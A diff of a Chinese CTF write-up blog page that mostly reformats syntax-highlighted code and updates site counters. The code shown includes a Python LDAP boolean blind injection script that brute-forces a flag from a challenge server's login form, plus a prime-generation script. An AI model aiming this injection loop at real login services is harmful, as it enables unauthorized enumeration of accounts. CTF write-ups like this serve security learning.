@@ -358,29 +358,29 @@
 <p>通过报错发现是ldap</p>
 <p>现学一波，没学明白</p>
 <p>LDAP查询语法</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">search语法：attribute operator value
-search filter options:( &#34;&amp;&#34; or &#34;|&#34; (filter1) (filter2) (filter3) ...) (&#34;!&#34; (filter))
-</code></pre></div><p>但是题目原因，可以通过布尔盲注来确定用户名</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">import</span> requests
-
-url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;http://47.106.172.144:2333&#39;</span>
-
-flag, done <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;LDAP&#39;</span>, <span style="color:#ff79c6">False</span>
-<span style="color:#ff79c6">while</span> <span style="color:#ff79c6">not</span> done:
-    <span style="color:#ff79c6">for</span> j <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">33</span>, <span style="color:#bd93f9">127</span>):
-        payload <span style="color:#ff79c6">=</span> flag <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">chr</span>(j) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;*&#39;</span>
-        data <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#39;user&#39;</span>: payload, <span style="color:#f1fa8c">&#39;pass&#39;</span>: <span style="color:#f1fa8c">&#39;123&#39;</span>}
-        r <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(url, params<span style="color:#ff79c6">=</span>data)
-        
-        <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#39;密码错误&#39;</span> <span style="color:#ff79c6">in</span> r<span style="color:#ff79c6">.</span>text <span style="color:#ff79c6">or</span> <span style="color:#f1fa8c">&#39;查询用户不唯一&#39;</span> <span style="color:#ff79c6">in</span> r<span style="color:#ff79c6">.</span>text:
-            flag <span style="color:#ff79c6">+=</span> <span style="color:#8be9fd;font-style:italic">chr</span>(j)
-            <span style="color:#8be9fd;font-style:italic">print</span>(flag)
-            <span style="color:#ff79c6">break</span>
-    <span style="color:#ff79c6">else</span>:
-        done <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">True</span>
-
-<span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;flag{&#39;</span> <span style="color:#ff79c6">+</span> flag<span style="color:#ff79c6">.</span>lower() <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;}&#39;</span>)
-</code></pre></div><p>还就跑出来了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>search语法：attribute operator value
+</span></span><span style="display:flex;"><span>search filter options:( &#34;&amp;&#34; or &#34;|&#34; (filter1) (filter2) (filter3) ...) (&#34;!&#34; (filter))
+</span></span></code></pre></div><p>但是题目原因，可以通过布尔盲注来确定用户名</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;http://47.106.172.144:2333&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>flag, done <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;LDAP&#39;</span>, <span style="color:#ff79c6">False</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">while</span> <span style="color:#ff79c6">not</span> done:
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> j <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">33</span>, <span style="color:#bd93f9">127</span>):
+</span></span><span style="display:flex;"><span>        payload <span style="color:#ff79c6">=</span> flag <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">chr</span>(j) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;*&#39;</span>
+</span></span><span style="display:flex;"><span>        data <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#39;user&#39;</span>: payload, <span style="color:#f1fa8c">&#39;pass&#39;</span>: <span style="color:#f1fa8c">&#39;123&#39;</span>}
+</span></span><span style="display:flex;"><span>        r <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(url, params<span style="color:#ff79c6">=</span>data)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#39;密码错误&#39;</span> <span style="color:#ff79c6">in</span> r<span style="color:#ff79c6">.</span>text <span style="color:#ff79c6">or</span> <span style="color:#f1fa8c">&#39;查询用户不唯一&#39;</span> <span style="color:#ff79c6">in</span> r<span style="color:#ff79c6">.</span>text:
+</span></span><span style="display:flex;"><span>            flag <span style="color:#ff79c6">+=</span> <span style="color:#8be9fd;font-style:italic">chr</span>(j)
+</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(flag)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">break</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span>:
+</span></span><span style="display:flex;"><span>        done <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">True</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;flag{&#39;</span> <span style="color:#ff79c6">+</span> flag<span style="color:#ff79c6">.</span>lower() <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;}&#39;</span>)
+</span></span></code></pre></div><p>还就跑出来了</p>
 <h3 id="misc">MISC</h3>
 <h2 id="签到签到">[签到]签到</h2>
 <p>flag{Dnui_ctf_2021_s1gn_in}</p>
@@ -420,21 +420,21 @@ flag, done <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39
 <p>CLCKOUTHK</p>
 <h2 id="萌新素数">[萌新]素数</h2>
 <p>10个不重复的长度&gt;=1024bits的素数</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">import</span> gmpy2
-<span style="color:#ff79c6">from</span> gmpy2 <span style="color:#ff79c6">import</span> mpz
-
-rs <span style="color:#ff79c6">=</span> gmpy2<span style="color:#ff79c6">.</span>random_state()
-
-<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">gen_prime</span>():
-    p <span style="color:#ff79c6">=</span> gmpy2<span style="color:#ff79c6">.</span>mpz_urandomb(rs, <span style="color:#bd93f9">1024</span>)
-    <span style="color:#ff79c6">while</span> <span style="color:#ff79c6">not</span> gmpy2<span style="color:#ff79c6">.</span>is_prime(p):
-        p <span style="color:#ff79c6">=</span> gmpy2<span style="color:#ff79c6">.</span>add(p, <span style="color:#bd93f9">1</span>)
-    <span style="color:#ff79c6">return</span> p
-
-<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">100</span>):
-    p <span style="color:#ff79c6">=</span> gen_prime()
-    <span style="color:#8be9fd;font-style:italic">print</span>(p)
-</code></pre></div><p>多弄几遍，有时候生成的数不是309位整数</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> gmpy2
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> gmpy2 <span style="color:#ff79c6">import</span> mpz
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rs <span style="color:#ff79c6">=</span> gmpy2<span style="color:#ff79c6">.</span>random_state()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">gen_prime</span>():
+</span></span><span style="display:flex;"><span>    p <span style="color:#ff79c6">=</span> gmpy2<span style="color:#ff79c6">.</span>mpz_urandomb(rs, <span style="color:#bd93f9">1024</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">while</span> <span style="color:#ff79c6">not</span> gmpy2<span style="color:#ff79c6">.</span>is_prime(p):
+</span></span><span style="display:flex;"><span>        p <span style="color:#ff79c6">=</span> gmpy2<span style="color:#ff79c6">.</span>add(p, <span style="color:#bd93f9">1</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> p
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">100</span>):
+</span></span><span style="display:flex;"><span>    p <span style="color:#ff79c6">=</span> gen_prime()
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(p)
+</span></span></code></pre></div><p>多弄几遍，有时候生成的数不是309位整数</p>
 
 </section>
 
@@ -520,7 +520,7 @@ rs <span style="color:#ff79c6">=</span> gmpy2<span style="color:#ff79c6">.</span
     <div class="disqus-container">
     <div id="disqus_thread"></div>
 <script type="application/javascript">
-    var disqus_config = function () {
+    window.disqus_config = function () {
     
     
     
@@ -631,6 +631,8 @@ rs <span style="color:#ff79c6">=</span> gmpy2<span style="color:#ff79c6">.</span
 
     
 
+    
+
 
 <script>
 (function(u, c) {
@@ -650,7 +652,7 @@ rs <span style="color:#ff79c6">=</span> gmpy2<span style="color:#ff79c6">.</span
             2020 - 
         
         2022 <a href="https://stack-theme-mod.vercel.app/">茄子的养殖场</a>·<i class="fas fa-bell"></i> <a id="days">0</a>Days<br>
-      共书写了33.2k字·共 29篇文章</br><span><p>
+      共书写了33.5k字·共 30篇文章</br><span><p>
     </section>
     
     <section class="powerby">
@@ -838,7 +840,7 @@ document.getElementById('days').innerHTML = number_of_days;
         <div class="category-list">
             <div class="category-list-item"><a href="https://proben1.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="category-list-link">学习笔记<span class="category-list-count">24</a>
             </span></div>
-            <div class="category-list-item"><a href="https://proben1.github.io/categories/%E5%B0%8F%E4%BA%BA%E8%81%94%E5%90%88%E5%B7%A5%E4%BC%9A%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/" class="category-list-link">小人联合工会内部资料<span class="category-list-count">1</a>
+            <div class="category-list-item"><a href="https://proben1.github.io/categories/%E5%B0%8F%E4%BA%BA%E8%81%94%E5%90%88%E5%B7%A5%E4%BC%9A%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/" class="category-list-link">小人联合工会内部资料<span class="category-list-count">2</a>
             </span></div>
             <div class="category-list-item"><a href="https://proben1.github.io/categories/%E6%95%B4%E7%82%B9%E5%B0%8F%E6%B4%BB/" class="category-list-link">整点小活<span class="category-list-count">4</a>
             </span></div>
